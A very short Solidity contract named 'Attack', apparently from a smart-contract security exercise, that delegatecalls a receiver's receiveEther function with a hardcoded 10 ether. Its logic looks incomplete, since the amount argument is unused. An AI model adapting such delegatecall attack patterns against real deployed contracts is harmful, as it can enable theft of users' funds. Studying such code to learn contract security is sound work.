pragma solidity ^0.8.0;

// import "hardhat/console.sol";

contract Attack {
    address payable public receiver;

    constructor(address payable _receiver) public {
        receiver = _receiver;
    }

    function receiveEther(uint256 _amount) public payable {
        receiver.delegatecall(
            abi.encodeWithSignature("receiveEther(uint256)", 10 ether)
        );
    }
}
